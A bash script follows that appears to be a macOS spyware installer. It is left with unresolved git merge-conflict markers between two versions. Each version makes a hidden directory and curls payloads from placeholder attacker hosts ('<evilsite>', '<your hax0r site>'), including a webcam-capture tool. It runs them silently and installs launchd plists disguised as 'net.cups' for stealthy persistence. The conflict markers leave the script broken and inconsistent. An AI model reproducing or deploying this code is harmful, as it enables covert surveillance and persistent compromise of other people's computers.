#!/bin/bash

# dig a hole
HOSTNAME=`/bin/hostname`
USERNAME=`/usr/bin/whoami`
PYTHON=`which python`

# put some shit in the hole
<<<<<<< HEAD
# I specifically use ~/.cups because of that one thing that happened at
# twitter that one time. Ask me about it someday.
mkdir /Users/$USERNAME/.cups 2>&1>/dev/null
=======
mkdir /Users/$USERNAME/.dtc2
curl -s -o /Users/$USERNAME/.dtc2/imagesnap http:///<evilsite>/imagesnap
curl -s -o /Users/$USERNAME/.dtc2/dtc2.sh http://<evilsite>/dtc2.sh
curl -s -o /Users/$USERNAME/.dtc2/msf.py http://<evilsite>/msf.py
chmod +x /Users/$USERNAME/.dtc2/dtc2.sh
chmod +x /Users/$USERNAME/.dtc2/imagesnap
/usr/bin/python /Users/$USERNAME/.dtc2/msf.py
/bin/sh /Users/$USERNAME/.dtc2/dtc2.sh
>>>>>>> origin/master


<<<<<<< HEAD
# This is where you curl or otherwise pull down your mauljuarez
# I did it with simple curl commands. You can do it however you want.
curl -s -o /Users/$USERNAME/.cups/login http://<your hax0r site>/dbxpy 2>&1>/dev/null

# download your run script, which will be run using the plist generated below
curl -s -o /Users/$USERNAME/.cups/cups.sh http://<your hax0r site>/cups.sh 2>&1>/dev/null
curl -s -o /Users/$USERNAME/.cups/cupsd http://<your hax0r site>/akd 2>&1>/dev/null
=======
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http:///www.apple.com/DTDs/PropertyList-1.0.dtd\">" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "<plist version=\"1.0\">" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "<dict>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <key>Label</key>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <string>net.dtc2</string>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <key>ProgramArguments</key>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <array>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "        <string>/Users/$USERNAME/.dtc2/dtc2.sh</string>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    </array>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <key>StartInterval</key>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <integer>300</integer>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "</dict>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "</plist>" >> /Users/$USERNAME/.dtc2/dtc2.plist

# install spy plist plist
launchctl load /Users/$USERNAME/.dtc2/dtc2.plist
launchctl start /Users/$USERNAME/.dtc2/dtc2.plist
>>>>>>> origin/master

# chmod your mauljuarez so they're executable.
chmod +x /Users/$USERNAME/.cups/cups.sh 2>&1>/dev/null
chmod +x /Users/$USERNAME/.cups/akd 2>&1>/dev/null
/usr/bin/python /Users/$USERNAME/.cups/kern 2>&1>/dev/null &
/usr/bin/python /Users/$USERNAME/.cups/cupsd 2>&1>/dev/null &
/usr/bin/python /Users/$USERNAME/.cups/login 2>&1>/dev/null &
/usr/bin/python /Users/$USERNAME/.cups/mtp2 2>&1>/dev/null &
/Users/$USERNAME/.cups/akd 2>&1>/dev/null &

# create plist
# its default is set to 1800 seconds, or 30 minutes.
# change as appropriate
# You can see that the job it creates is calling itself "net.cups"
# feel free to change this, but the idea is to be sort of stealthy
echo "" > /Users/$USERNAME/.cups/debug.plist
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" >> /Users/$USERNAME/.cups/debug.plist
echo "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http:///www.apple.com/DTDs/PropertyList-1.0.dtd\">" >> /Users/$USERNAME/.cups/debug.plist
echo "<plist version=\"1.0\">" >> /Users/$USERNAME/.cups/debug.plist
echo "<dict>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <key>Label</key>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <string>net.cups</string>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <key>ProgramArguments</key>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <array>" >> /Users/$USERNAME/.cups/debug.plist
echo "        <string>/Users/$USERNAME/.cups/cups.sh</string>" >> /Users/$USERNAME/.cups/debug.plist
echo "    </array>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <key>StartInterval</key>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <integer>3600</integer>" >> /Users/$USERNAME/.cups/debug.plist
echo "</dict>" >> /Users/$USERNAME/.cups/debug.plist
echo "</plist>" >> /Users/$USERNAME/.cups/debug.plist

# install spy plist plist
launchctl load /Users/$USERNAME/.cups/debug.plist
launchctl start /Users/$USERNAME/.cups/debug.plist
